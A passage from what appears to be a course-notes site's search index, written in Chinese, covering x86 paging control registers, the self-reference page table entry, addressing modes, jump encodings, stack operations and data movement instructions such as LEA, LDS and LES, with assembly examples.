\u65f6\u88ab\u8bbe\u7f6e</li> </ul> </li> <li>Control Register 2: \u4fdd\u5b58\u53d1\u751f Page Fault \u65f6\u7684 Linear Address<ul> <li>Handler \u901a\u8fc7\u8bfb\u53d6 CR2 \u6765\u786e\u5b9a\u54ea\u4e2a\u5730\u5740\u5bfc\u81f4\u4e86\u9519\u8bef\uff0c\u4ece\u800c\u6267\u884c\u7f3a\u9875\u8c03\u5165\u3001\u6743\u9650\u68c0\u67e5\u3001\u8fdb\u7a0b\u7ec8\u6b62\u7b49\u64cd\u4f5c</li> </ul> </li> <li>Control Register 3: \u5b58\u50a8\u9875\u76ee\u5f55\u7684 Physical Address<ul> <li>Page-Directory Base: \u9875\u76ee\u5f55\u57fa\u5730\u5740</li> </ul> </li> <li>Control Register 4: Pentium \u5f00\u59cb\u65b0\u589e\u7684\u63a7\u5236\u5bc4\u5b58\u5668\uff0c\u62d3\u5c55\u4e86\u539f\u6709\u7684\u5206\u9875\u67b6\u6784\u63a7\u5236<ul> <li>PSE(bit 4) \u662f\u5426\u542f\u7528\u5927\u9875\u62d3\u5c55\u3002\u5f00\u542f\u540e\u5141\u8bb8 PDE \u76f4\u63a5\u6620\u5c04 4MB \u7684\u5927\u9875<ul> <li>\u5f53 <code>CR4.PSE=1</code> and <code>PDE.PS=1</code> \u65f6\uff0c\u8be5 PDE \u6620\u5c04\u5230\u4e00\u4e2a 4MB Page</li> <li>\u5f53 <code>CR4.PSE=1</code> and <code>PDE.PS=0</code> \u65f6\uff0c\u8be5 PDE \u6620\u5c04\u5230\u4e00\u4e2a 4KB Page</li> </ul> </li> <li>PAE(bit 5) \u662f\u5426\u542f\u7528\u7269\u7406\u5730\u5740\u62d3\u5c55\u3002\u5f00\u542f\u540e\u5141\u8bb8\u7269\u7406\u5730\u5740\u7a7a\u95f4\u8d85\u8fc7 4GB<ul> <li>\u4f8b\u5982 36-bit \u7269\u7406\u5730\u5740\uff0c\u53ef\u5bfb\u5740 64GB \u5185\u5b58\uff1b\u6b64\u65f6 Linear Address \u8fd8\u662f 32-bit</li> <li>PAE \u542f\u7528\u7684\u6761\u4ef6\u4e0b\u5141\u8bb8\u6620\u5c04 2MB Page\uff0c\u6b64\u65f6 PSE \u4f4d\u88ab\u5ffd\u7565\uff0c\u5927\u9875\u8fbe\u4e0d\u5230 4MB</li> </ul> </li> </ul> </li> </ul> PSEPAE <p></p> <p></p> <p>\u5047\u5b9a\u6211\u4eec\u8981\u5bf9\u4e00\u4e2a Page Table \u8fdb\u884c\u8bbf\u95ee\uff0c\u7531\u4e8e\u6211\u4eec\u53ea\u80fd\u901a\u8fc7\u865a\u62df\u5185\u5b58\u6765\u4e0e Memory \u4ea4\u4e92\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u5f97\u5230 Page Table \u4e0a\u4e00\u4e2a entry \u7684\u865a\u62df\u5185\u5b58\uff1f</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cOS \u4e3a Page Table \u8bbe\u7f6e\u4e86\u4e00\u4e2a self-reference table entry\uff0c\u8fd9\u4e2a entry \u5b58\u50a8\u4e86\u6307\u5411\u81ea\u5df1\u6240\u5904\u7684 Table \u7684\u57fa\u5730\u5740\u3002Windows 32 bit \u5c06 <code>0x300</code> entry \u4f5c\u4e3a self-reference table entry\uff0c\u6211\u4eec\u63a5\u4e0b\u6765\u4e5f\u5c06\u4ee5\u6b64\u4e3a\u4f8b\u4f5c\u4e3a\u8bb2\u89e3\u3002</p> <p>\u5728 10-10-12 \u6a21\u578b\u4e0b\u7ed9\u51fa\u4e00\u4e2a\u865a\u62df\u5730\u5740 \\(VA\\)\uff0c\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u5bf9\u8be5\u865a\u62df\u5730\u5740\u8fdb\u884c\u6620\u5c04\u65f6\u7ecf\u8fc7\u7684 entry \u7684\u865a\u62df\u5730\u5740\uff0c\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u516c\u5f0f\u8ba1\u7b97\uff1a</p> \\[\\begin{array}l \\text{GetPteVaAddress: } 0xc0000000 + [(va&gt;&gt;12)&lt;&lt;2]\\\\ \\text{GetPdeVaAddress: } 0xc0300000 + [(va&gt;&gt;22)&lt;&lt;2] \\end{array} \\] <p>\u5177\u4f53\u539f\u7406\u53ef\u89c1\u4ee5\u4e0b\u793a\u4f8b\uff0c\u5176\u4e2d\u6700\u540e\u7684 <code>0x321</code> \u8981\u4e58\u4ee5 4\uff08\u5de6\u79fb\u4e24\u4f4d\uff09\u662f\u56e0\u4e3a\u6700\u540e\u7684 offset \u662f\u76f4\u63a5\u52a0\u5728\u57fa\u5730\u5740\u4e0a\u7684\uff0c\u6240\u4ee5\u8981\u4e58\u4e0a\u4e00\u4e2a entry \u7684\u5927\u5c0f 4B\uff1a</p> <p></p> <p>Total Meltdown</p> <p>Windows 64 \u672c\u6765\u9009\u7528\u56fa\u5b9a\u4f4d\u7f6e <code>0x1ED</code> \u4f5c\u4e3a self-reference entry\uff0c\u4f46\u662f\u66fe\u7ecf\u6709\u4eba\u5c06\u8fd9\u4e2a entry \u7684\u6743\u9650\u8bbe\u7f6e\u6210 User \u4ece\u800c\u83b7\u5f97\u4e86\u6574\u4e2a\u7269\u7406\u5185\u5b58\u7684\u6743\u9650\uff0c\u56e0\u6b64\u4ece Windows 10 \u5f00\u59cb\u5c06\u8be5\u503c\u8bbe\u7f6e\u4e3a\u7cfb\u7edf\u542f\u52a8\u65f6\u968f\u673a\u9009\u62e9\u3002</p>"},{"location":"Courses/asm/ch2/#addressing-modes","title":"Addressing Modes","text":"<p>\u5bf9\u4e8e\u4e09\u79cd\u4e0d\u540c\u7684 Operation Modes\uff0c\u5b83\u4eec\u9ed8\u8ba4\u7684 Address Size \u548c Operand Size \u5982\u4e0b\uff1a</p> <ul> <li>16-bit Modes<ul> <li>16-bit address &amp; 16-bit operand</li> </ul> </li> <li>32-bit Protected Modes<ul> <li>32-bit address &amp; 32-bit operand</li> </ul> </li> <li>64-bit Modes<ul> <li>64-bit address &amp; 32-bit operand</li> </ul> </li> </ul> <p>\u4f8b\u5982\uff0c\u5728 64-bit \u4e0b\uff0c\u6307\u4ee4 <code>MOV EAX, [RBX]</code> \u4e2d <code>EAX</code> \u662f 32-bit \u64cd\u4f5c\u6570\uff0c<code>RBX</code> \u7528\u6765 64-bit \u5bfb\u5740\u3002</p> <p></p>"},{"location":"Courses/asm/ch2/#_1","title":"\u6570\u636e\u5bfb\u5740","text":"<p>\u5728 x86 \u5bfb\u5740\u4e2d\uff0c\u4e00\u4e2a\u504f\u79fb\u5730\u5740\u53ef\u80fd\u7531\u5982\u4e0b\u56db\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a</p> \\[ \\text{Effective Address} = \\text{Base} + \\text{Scale}\\times\\text{Index} + \\text{Displacement} \\] <p>\u8fd9\u4e9b\u90e8\u5206\u4e0d\u662f\u5fc5\u987b\u51fa\u73b0\uff0c\u6839\u636e\u7ec4\u5408\uff0c\u6211\u4eec\u5c06 Addressing Mode \u5212\u5206\u4e3a\u4ee5\u4e0b\u516d\u79cd\uff1a</p> <ul> <li>Direct Data Addressing (Disp)<ul> <li>\u4e0e A \u7cfb\u5217\u5bc4\u5b58\u5668\u76f8\u5173\u7684 <code>MOV</code> \u6307\u4ee4\u88ab\u79f0\u4e3a Direct Addressing\uff0c\u7279\u5f81\u662f\u8bd1\u7801\u5f97\u5230\u7684\u5b57\u8282\u7801\u957f\u5ea6\u66f4\u77ed<ul> <li><code>MOV AL, [1234H] ; A0 34 12</code></li> </ul> </li> <li>\u9664\u6b64\u4e4b\u5916\u7684\u6307\u4ee4\u88ab\u79f0\u4e3a Displacement Addressing<ul> <li><code>MOV CL, [1234H] ; 8A 0E 34 12</code></li> </ul> </li> </ul> </li> <li>Register Indirect Addressing (Base)</li> <li>Base-Plus-Index Addressing (Base + Index)</li> <li>Register Relative Addressing (Base/Index + Disp)</li> <li>Base Relative-Plus-Index Addressing (Base + Index + Disp)</li> <li>Scaled-Index Addressing (Base+Scale\u00d7Index+Disp)</li> </ul> <p>\u4e0b\u9762\u6211\u4eec\u4ee5\u4e00\u4e9b\u7f16\u8bd1\u5668\u7684\u5b9e\u4f8b\u6765\u8bf4\u660e\uff1a</p> <pre><code>int var;        |  f:\n                |    mov eax, [esp+4] ; index + disp\nvoid f(int x)   |    mov var, eax     ; disp(Direct Addressing)\n{ var = x; }    |    ret\n</code></pre> <pre><code>int foo(char *buf, int index)  |  foo:\n{                              |    mov eax, [esp+4] ; eax = buf\n    return buf[index];         |    mov edx, [esp+8] ; edx = index\n}                              |    movsx eax, BYTE PTR [edx+eax]\n                               |       ; base + index\n</code></pre> <pre><code>struct foo {              |  bar:\n    int a;                |    mov eax, [esp+4] ; eax = f\n    int b;                |    mov eax, [eax+4] ; eax = *(f+4) \\\n};                        |                           = f-&gt;b\n                          |    ret\nint bar(struct foo *f) {  |\n    return f-&gt;b;          |\n}                         |\n</code></pre> <pre><code>struct foo {                         |  query:\n    int a;                           |    mov eax, [esp+4]\n    int b;                           |    mov ecx, [esp+8]\n    int c;                           |    shl ecx, 4 ; ecx = 16 * i\n    int d;                           |    mov eax, [eax+ecx+12]\n};                                   |       ; [fs+16*i+12]=fs[i].d\n                                     |    ret\nint query(struct foo fs[], int i) {  |\n    struct foo x = fs[i];            |\n    return x.d;                      |\n}                                    |\n</code></pre> <p>\u5728 8086-80286 \u95f4\u63a5\u5bfb\u5740\u4e2d\uff0c<code>base</code> \u53ef\u9009 <code>BX</code> \u548c <code>BP</code>\uff0c<code>index</code> \u53ef\u9009 <code>SI</code> \u548c <code>DI</code>\uff0c<code>scale</code> \u53ef\u9009 1,2,4,8\u3002</p> <p>\u5f53\u65b9\u62ec\u53f7\u4e2d\u9009\u7528\u5bc4\u5b58\u5668 <code>BP</code>/<code>EBP</code>/<code>ESP</code> \u4f5c\u4e3a <code>base</code> \u65f6\uff0c\u5219\u7f3a\u7701\u6bb5\u5740\u9ed8\u8ba4\u4e3a <code>SS</code>\uff1b\u5426\u5219\uff0c\u5747\u4e3a <code>DS</code>\u3002</p> <p>\u4ece 80386\uff0832-bit\uff09\u5f00\u59cb\uff0c\u6240\u6709 32-bit \u5bc4\u5b58\u5668\u90fd\u53ef\u4ee5\u4f5c\u4e3a <code>base</code> \u548c <code>index</code></p> <p>Which addressing mode in the following instruction is invalid ?</p> <ul> <li>A.</li> <li>B.</li> <li>C.</li> <li>D. <ul> <li><code>ESP</code> \u4e0d\u80fd\u4f5c\u4e3a <code>index</code></li> </ul> </li> </ul> <p>\u5728 x86-64 \u7cfb\u7edf\u4e0a\uff0cLinear Address \u7684\u903b\u8f91\u957f\u5ea6\u4e3a 64-bit\u3002\u4f46\u662f\u6211\u4eec\u505a\u5206\u9875\u65f6\u6240\u7528\u7684 Effective Address \u901a\u5e38\u662f 48-bit \u6216 57-bit \u7684\uff0c\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7b26\u53f7\u6269\u5c55\u6765\u589e\u5927\u5730\u5740\u7a7a\u95f4\uff0c\u8fd9\u88ab\u79f0\u4e3a canonical address\uff0c\u4f8b\u5982\uff1a</p> <p></p>"},{"location":"Courses/asm/ch2/#_2","title":"\u4ee3\u7801\u5bfb\u5740","text":"<p>\u4ee3\u7801\u5bfb\u5740\u901a\u5e38\u4e0e\u6307\u4ee4 <code>JMP</code>, <code>CALL</code> \u76f8\u5173\uff0cdst operand \u6307\u5b9a\u4e86\u6307\u4ee4\u5373\u5c06\u8df3\u8f6c\u5230\u7684\u5730\u5740\u3002</p> <p>\u6839\u636e jump offset \u7684\u7c7b\u578b\uff0c\u53ef\u5206\u7c7b\u4e3a\u4ee5\u4e0b\u4e24\u79cd\uff1a</p> <ul> <li>relative offset<ul> <li>\u901a\u5e38\u6307\u5b9a\u4e3a\u8df3\u8f6c\u5230\u4e00\u4e2a label\uff0c\u7f16\u8bd1\u65f6\u4f1a\u88ab\u7f16\u7801\u4e3a\u76f8\u5bf9\u5f53\u524d\u6307\u4ee4 IP \u7684\u7b26\u53f7\u504f\u79fb</li> </ul> </li> <li>absolute offset<ul> <li>\u6307\u5b9a\u4e00\u4e2a General-Purpose Register \u6216 Memory Location\uff0c\u5c06\u8fd9\u4e2a\u503c\u76f4\u63a5\u52a0\u8f7d\u5230 PC</li> <li>\u7edd\u5bf9\u504f\u79fb\u4ee5 code segment \u4f5c\u4e3a\u57fa</li> </ul> </li> </ul> <p>\u524d\u4e00\u4e2a jump \u662f\u76f8\u5bf9\u504f\u79fb\uff0c\u540e\u4e00\u4e2a jump \u662f\u7edd\u5bf9\u504f\u79fb</p> <p></p> <p>\u6839\u636e jumps \u7684\u7c7b\u578b\uff0c\u53ef\u5206\u7c7b\u4e3a\u4ee5\u4e0b\u56db\u79cd\uff1a</p> <ul> <li>\u77ed\u8df3(short jump)\u00a0\uff1a\u8df3\u8f6c\u8ddd\u79bb\u7528\u4e00\u4e2a\u5b57\u8282\uff081 Byte\uff09\u8868\u793a\uff0c\u673a\u5668\u7801\u4ee5\u00a0<code>EB</code>\u00a0\u5f00\u5934<ul> <li>jump range \u8303\u56f4\u4e3a -128 to +127</li> <li>\u77ed\u8df3\u540e\u9762\u53ea\u80fd\u63a5\u76ee\u6807\u504f\u79fb\u5730\u5740\u6216\u6807\u53f7\uff1b\u800c\u8fd1\u8df3\u8fd8\u53ef\u4ee5\u63a5 16 \u4f4d\u5bc4\u5b58\u5668\u6216 16 \u4f4d\u53d8\u91cf</li> <li>\u77ed\u8df3\u673a\u5668\u7801\u7684 idata \u4e3a\u4e00\u4e2a\u5b57\u8282\uff0c\u5bf9\u5e94\u5927\u5c0f\u4e3a\u76ee\u6807\u5730\u5740\u51cf\u53bb\u4e0b\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740($+2)</li> </ul> </li> <li>\u8fd1\u8df3(near jump)\u00a0\uff1a\u8df3\u8f6c\u8ddd\u79bb\u6216\u76ee\u6807\u5730\u5740\u7528\u4e00\u4e2a\u5b57\uff082 Byte\uff09\u8868\u793a\uff0c\u673a\u5668\u7801\u4ee5\u00a0<code>E9</code>\u00a0\u5f00\u5934<ul> <li>\u673a\u5668\u7801\u00a0<code>E9FD1E</code>\u00a0\u5bf9\u5e94\u6307\u4ee4\u00a0<code>1D3E:0100: jmp 2000h</code>\u00a0\u5373\u8df3\u8f6c\u5230\u5730\u5740\u00a0<code>1D3E:2000</code></li> <li>\u5176\u4e2d\u00a0<code>FD1E</code>\u00a0\u542b\u4e49\u4e3a\u00a0<code>1EFD = 2000h - 0103h</code>\uff0c\u5373\u76ee\u6807\u5730\u5740\u51cf\u53bb\u4e0b\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740</li> <li>\u504f\u79fb\u5730\u5740\u5728\u673a\u5668\u7801\u4e2d\u4e5f\u662f\u5c0f\u7aef\u5b58\u50a8</li> </ul> </li> <li>\u8fdc\u8df3(far jump)\u00a0\uff1a\u76ee\u6807\u5730\u5740\u7528\u4e00\u4e2a\u8fdc\u6307\u9488\u8868\u793a(\u6bb5\u5730\u5740\uff1a\u504f\u79fb\u5730\u5740)\uff0c\u673a\u5668\u7801\u4ee5\u00a0<code>EA</code>\u00a0\u5f00\u5934<ul> <li>\u673a\u5668\u7801\u00a0<code>EA0000FFFF</code>\u00a0\u5bf9\u5e94\u6307\u4ee4\u00a0<code>jmp 0FFFFh:0000h</code>\u00a0\u3002\u4f46\u662f\u5b9e\u9645\u4e0a\u8fdc\u8df3\u4e0d\u80fd\u76f4\u63a5\u63a5\u5e38\u6570\u5730\u5740\u3002</li> <li>\u5982\u679c\u8981\u8df3\u8f6c\u5230\u4e0d\u540c\u6bb5\uff0c\u4e00\u5b9a\u662f\u4f7f\u7528\u8fdc\u8df3\uff1b\u4f8b\u5982\u4e0d\u540c\u6a21\u5f0f\u5207\u6362\u65f6</li> </ul> </li> <li>Task Switch \uff1a\u8df3\u8f6c\u5230\u4e0d\u540c task \u4e2d\u7684\u6307\u4ee4\u5904\uff0c\u53ea\u5b58\u5728\u4e8e protection mode</li> </ul>"},{"location":"Courses/asm/ch2/#_3","title":"\u6808\u5bfb\u5740","text":"<p>\u4e0e\u6808\u5185\u5b58\u4ea4\u4e92\u901a\u5e38\u4f7f\u7528 <code>PUSH</code>, <code>POP</code> \u8fdb\u884c\uff0c\u8fd9\u4e24\u4e2a\u6307\u4ee4\u603b\u5171\u6709\u516d\u79cd\u5f62\u5f0f\uff1a</p> <ul> <li>register, memory, immediate\uff08\u7acb\u5373\u6570\u53ea\u80fd\u5165\u6808\uff0c\u4e0d\u80fd\u51fa\u6808\uff09</li> <li>segment register, flags, all registers</li> </ul> <p>The <code>PUSH</code> and <code>POP</code> immediate &amp; <code>PUSHA</code> and <code>POPA</code> (all registers) available 80286 - Core2.</p> <p>\u6808\u5bfb\u5740\u76f8\u5173\u7684\u64cd\u4f5c\u57fa\u5730\u5740\u5747\u4e3a <code>SS</code>\uff0c\u504f\u79fb\u5747\u4e3a <code>SP</code>(\u6216 <code>ESP</code>)\u3002</p> <p>\u7531\u4e8e\u662f\u5c0f\u7aef\u5bfb\u5740\uff0c\u5728\u591a\u5b57\u8282\u6570\u636e\u5165\u6808\u65f6\uff0c\u9ad8\u4f4d\u5b57\u8282\u5148\u5165\u6808\uff0c\u4f4e\u4f4d\u5b57\u8282\u540e\u5165\u6808\u3002</p> <p>\u6c47\u7f16\u4ee3\u7801\u4e2d\uff0c\u5806\u6808\u7aef\u53ea\u80fd\u521b\u5efa\u4e00\u6b21\uff0c\u521b\u5efa\u65f6\uff0c<code>SS:[SP]</code> \u6307\u5411\u6808\u9876\uff0c<code>SP</code> \u6307\u5411\u5806\u6808\u6bb5\u7684\u672b\u5c3e\uff1a</p> <pre><code>stk segment stack ; \u5f00\u8f9f\u4e00\u6bb5\u5806\u6808\u7a7a\u95f4\uff0c\u91cc\u9762\u7684'S'\u53ea\u662f\u7528\u6765\u5360\u4f4d\u7684\na db 200h dup('S')\nstk ends\n\n----\n\n+-------------+ &lt;- ss:[sp], sp = \u5806\u6808\u957f\u5ea6\n|stack segment|\n+-------------+ &lt;- ss:[sp - 200h] or ss\n|code  segment|\n+-------------+ &lt;- cs:[ip], ip = offset main\n|data  segment|\n+-------------+ &lt;- ds\n</code></pre> <p>\u5728 8086 - 80286 \u4e2d\uff0c<code>PUSH</code> \u6307\u4ee4\u53ea\u80fd\u4f20\u9012 2 Bytes \u5927\u5c0f\u7684\u6570\u636e\uff1b\u800c 80386 \u5f00\u59cb\uff0c\u89c6 <code>PUSH</code> \u540e\u63a5\u7684\u64cd\u4f5c\u6570\u5927\u5c0f\uff0c\u53ef\u4ee5\u4f20\u9012 2 Bytes, 4 Bytes, 8 Bytes \u5927\u5c0f\u7684\u6570\u636e\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709 <code>PUSHA</code>, <code>PUSHAD</code>, <code>PUSHF</code> \u7b49\u7279\u6b8a\u7684 push \u6307\u4ee4\uff1a</p> <ul> <li><code>PUSHA</code> push all<ul> <li>\u6309\u7167 <code>AX</code>, <code>CX</code>, <code>DX</code>, <code>BX</code>, <code>SP</code>, <code>BP</code>, <code>SI</code>, <code>DI</code> \u987a\u5e8f\u5165\u6808</li> <li>\u64cd\u4f5c\u6570\u5927\u5c0f\u4e3a 2 Bytes</li> </ul> </li> <li><code>PUSHAD</code> push all double<ul> <li>\u64cd\u4f5c\u6570\u5927\u5c0f\u4e3a 4 Bytes</li> </ul> </li> <li><code>PUSHF</code> push flags<ul> <li>\u5c06 FLAG \u5165\u6808</li> </ul> </li> </ul> <p><code>POP</code> \u76f8\u5173\u7684\u540c\u7406\uff0c\u6b64\u5904\u4e0d\u518d\u4e66\u5199\u3002</p>"},{"location":"Courses/asm/ch4/","title":"Data Movement Instructions","text":""},{"location":"Courses/asm/ch4/#data-movement-instructions","title":"Data Movement Instructions","text":"<p> \u7ea6 2135 \u4e2a\u5b57  161 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p> <p>This chapter concentrates on the data movement instructions. The data movement instructions include <code>MOV</code>, <code>MOVSX</code>, <code>MOVZX</code>, <code>PUSH</code>, <code>POP</code>, <code>BSWAP</code>, <code>XCHG</code>, <code>XLAT</code>, <code>IN</code>, <code>OUT</code>, <code>LEA</code>, <code>LDS</code>, <code>LES</code>, <code>LFS</code>, <code>LGS</code>, <code>LSS</code>, <code>LAHF</code>, <code>SAHF</code>. String instructions: <code>MOVS</code>, <code>LODS</code>, <code>STOS</code>, <code>INS</code>, and <code>OUTS</code>. Data movement instructions do not affect flags.</p>"},{"location":"Courses/asm/ch4/#_1","title":"\u7f16\u7801\u683c\u5f0f","text":"<p>cm \u8001\u5e08\u8bf4\u5f80\u5e74\u90fd\u6ca1\u6709\u8003\uff0c\u4eca\u5e74\u8981\u8003\uff082025-2026 \u79cb\u51ac\uff09</p> <p>\u5728 code segment descriptor \u4e2d\uff0c\u5b58\u5728\u4e24\u4e2a\u4f4d\u6307\u793a\u4e86\u6307\u4ee4\u7684\u957f\u5ea6\u6a21\u5f0f\uff1a</p> <ul> <li>L=0 and D/B =0 for 16-bit instruction mode</li> <li>L=0 and D/B =1 for 32-bit instruction mode</li> <li>L=1 for 64-bit instruction mode</li> </ul> <p></p> <p>\u5728\u4e0d\u540c\u8fd0\u884c\u6a21\u5f0f\u4e0b\uff0c\u540c\u4e00\u6307\u4ee4\u7684\u7f16\u7801\u53ef\u80fd\u4e0d\u4e00\u6837\u3002\u4e0b\u9762\u6211\u4eec\u5bf9\u6bd4\u5982\u4e0b\u4e24\u79cd format\uff1a</p> <p></p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u5982\u4e0b\u6307\u4ee4\uff0c\u5b83\u5728 80286\uff0816-bit\uff09\u548c 80386\uff0832-bit\uff09\u4e0b\u7f16\u7801\u5c31\u6709\u6240\u4e0d\u540c\uff1a</p> <pre><code>in .286\nMOV WORD PTR [BX], 5 ;       C7 07 05 00\n\nin .386\nMOV WORD PTR [BX], 5 ; 67 66 C7 07 05 00\n                     ; \u56e0\u4e3a 16-bit \u4e0d\u662f 80386 \u7684\u9ed8\u8ba4\u957f\u5ea6\n</code></pre> <p>x86 \u4e2d\uff0c\u6307\u4ee4\u957f\u5ea6\u8303\u56f4\u4e3a 1 Byte - 15 Bytes\u3002\u6211\u4eec\u5c1d\u8bd5\u5206\u6790\u6307\u4ee4\u7f16\u7801\u4e2d\u7684\u51e0\u4e2a\u5173\u952e\u5b57\u6bb5\uff1a</p> <ul> <li>Opcode<ul> <li>\u5982\u679c Direction Bit = 1\uff0c\u6570\u636e\u6d41\u4ece R/M field \u6d41\u5411 REG field\uff0c\u5373 <code>MOV REG, R/M</code> \uff08Register or Memory\uff09</li> <li>\u5982\u679c Direction Bit = 0\uff0c\u6570\u636e\u6d41\u4ece REG field \u6d41\u5411 R/M field\uff0c\u5373 <code>MOV R/M, REG</code></li> </ul> </li> <li>MOD-REG-R/M<ul> <li>...</li> </ul> </li> </ul> <p>\u4e3a\u4ec0\u4e48\u4e0d\u50cf RISC-V \u4e00\u6837\u6307\u5b9a rs \u548c rd \u5462\uff1f</p> <p>\u8fd9\u662f\u56e0\u4e3a x86 \u4e2d\u5bfb\u5740\u4e0d\u4ec5\u4ec5\u662f\u5bc4\u5b58\u5668\u5bfb\u5740\uff0c\u8fd8\u6709\u5185\u5b58\u5bfb\u5740\u3002\u6240\u4ee5 x86 \u9009\u62e9\u56fa\u5b9a\u5bfb\u5740\u7684\u4e24\u4e2a\u57df\u4ee5\u53ca\u6570\u636e\u6d41\u7684\u65b9\u5411\u3002</p> <p></p> <p>\u5bf9\u4e8e\u6307\u4ee4 <code>MOV DL, [DI+1]</code>\uff0c\u5b83\u7684\u673a\u5668\u7801\u4e3a <code>8A5501H</code></p> <p>\u76f8\u6bd4\u4e8e\u4e0a\u56fe\uff0c<code>MOD</code> \u90e8\u5206\u4ece <code>00</code> \u53d8\u4e3a\u4e86 <code>01</code>\uff0c\u8868\u793a\u5b58\u5728 displacement\uff1b\u672b\u5c3e\u52a0\u4e86\u4e00\u4e2a <code>disp</code> \u6bb5\uff0c\u6570\u503c\u4e3a <code>01H</code>\u3002</p> <p>32-bit \u4e2d\u7684 Scaled-Index Byte \u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>    7   6   5   4   3   2   1   0\n+---+---+---+---+---+---+---+---+\n| S   S |   Index   |   Base    |\n+---+---+---+---+---+---+---+---+\n</code></pre> <p>\u5f53 <code>R/M</code> \u7b49\u4e8e <code>100</code> \u65f6\uff0cScaled-Index Byte \u88ab\u4f7f\u7528\uff1a</p> <p></p> <p>64-bit \u4e0b\uff0c... TODO</p>"},{"location":"Courses/asm/ch4/#instruction-set","title":"Instruction Set","text":"<p>\u672c\u8282\u4e3b\u8981\u8bb2\u89e3\u76f8\u5173\u6570\u636e\u64cd\u4f5c\u6307\u4ee4\u3002</p>"},{"location":"Courses/asm/ch4/#load-effective-address","title":"LOAD EFFECTIVE ADDRESS","text":"<p>Load-effective address instruction \u88ab\u8bbe\u8ba1\u7528\u6765\u652f\u6301 high-level language\uff0c\u5176\u7c7b\u578b\u5206\u4e3a\u4e24\u79cd\uff1a</p> <ul> <li><code>LEA</code>: \u52a0\u8f7d near point\uff0c\u5373 offset</li> <li><code>LDS</code>, <code>LES</code>, <code>LFS</code>, <code>LGS</code>, <code>LSS</code>: \u52a0\u8f7d far point\uff0c\u5373 segment selector &amp; offset</li> </ul> <p>LEA</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a lea dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u53d6\u53d8\u91cf\u7684\u504f\u79fb\u5730\u5740</li> <li>\u6ce8\u610f\uff1a \u7b49\u6548\u4e8e <code>mov dx, offset abc</code> \u4f46\u662f\u53ef\u4ee5\u7528\u6765\u4f5c\u52a0\u6cd5<ul> <li><code>lea dx, ds:[bx+si+3]</code> \u6b63\u786e</li> <li><code>mov dx, bx+si+3</code> \u9519\u8bef</li> <li><code>lea eax, [eax+eax*4]</code> \u5229\u7528 <code>lea</code> \u505a\u5e38\u6570\u4e58\u6cd5</li> <li>\u6307\u793a\u7b26 <code>OFFSET</code> \u4f1a\u5728\u7f16\u8bd1\u65f6\u66ff\u6362\u4e3a\u7acb\u5373\u6570\uff0c\u56e0\u6b64\u6548\u7387\u66f4\u9ad8\uff1b\u4f46\u9700\u8981\u52a8\u6001\u53d6\u5740\u662f\u7528\u4e0d\u4e86</li> </ul> </li> </ul> <p>LES</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a les dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5c06src\u6307\u5411\u5730\u5740\u7684\u9ad8\u5341\u516d\u4f4d\u5199\u5165es\uff0c\u4f4e\u5341\u516d\u4f4d\u5199\u5165dest</li> <li>\u6ce8\u610f\uff1a \u7531\u4e8e\u91c7\u53d6\u5c0f\u7aef\u5b58\u50a8\u6cd5\uff0c\u6240\u4ee5\u662f\u540e\u9762\u7684\u5b58\u5165es\uff0c\u4f8b\u5982\uff1a<ul> <li>\u4ece <code>ds:[bx]</code> \u8fde\u7eed\u5b58\u653e\u56db\u4e2a\u5b57\u8282: <code>9A,78,56,34</code></li> <li><code>les di, ds:[bx]</code></li> <li><code>ES=3456h, DI=789Ah</code></li> </ul> </li> </ul> <p>LDS</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a lds dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5c06src\u6307\u5411\u5730\u5740\u7684\u9ad8\u5341\u516d\u4f4d\u5199\u5165ds\uff0c\u4f4e\u5341\u516d\u4f4d\u5199\u5165dest</li> <li>\u6ce8\u610f\uff1a \u6ce8\u610f\u4e8b\u9879\u540c\u4e0a</li> </ul> Example <p>\u8bbe\u6709\u4e00\u5185\u5b58\u5b57X\uff0cX\u7684\u504f\u79fb\u5730\u5740\u4e0e\u6bb5\u5730\u5740\u6309\u987a\u5e8f\u5b58\u653e\u5728\u4ece\u5730\u5740 1000:10F0 \u8d77\u7684\u5185\u5b58\u5355\u5143\u4e2d\uff0c\u8bf7\u5199\u51fa\u6c47\u7f16\u6307\u4ee4\u628aX\u7684\u503c\u8d4b\u503c\u7ed9\u5bc4\u5b58\u5668AX\u3002(\u8981\u6c42\u4f7f\u7528LDS\u6307\u4ee4)</p> <pre><code>mov ax, 1000h\nmov ds, ax\nlds bx, dword ptr ds:[10F0h]\nmov ax, [bx]\n</code></pre> <p>\u8bbe\u6709\u4e00\u5185\u5b58\u5b57\u8282Y\uff0cY\u7684\u504f\u79fb\u5730\u5740\u4e0e\u6bb5\u5730\u5740\u6309\u987a\u5e8f\u5b58\u653e\u5728\u4ece\u5730\u57401000:10F0\u8d77\u7684\u5185\u5b58\u5355\u5143\u4e2d\uff0c\u8bf7\u5199\u51fa\u6c47\u7f16\u6307\u4ee4\u628aY\u7684\u503c\u52a01\u3002(\u8981\u6c42\u4f7f\u7528LES\u6307\u4ee4)</p> <pre><code>mov ax, 1000h\nmov ds, ax\nles di, dword ptr ds:[10F0h]\ninc byte ptr es:[di]\n</code></pre> <p>\u6700\u5e38\u4f7f\u7528\u7684\u53d6\u8fdc\u5730\u5740\u6307\u4ee4\u662f <code>LSS</code>\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u66f4\u65b9\u4fbf\u5730\u5207\u6362\u6808\uff1a</p> <pre><code>CLI\n\n# SAVE OLD SP, SS\nMOV AX, SP\nMOV WORD PTR SADDR, AX\nMOV AX, 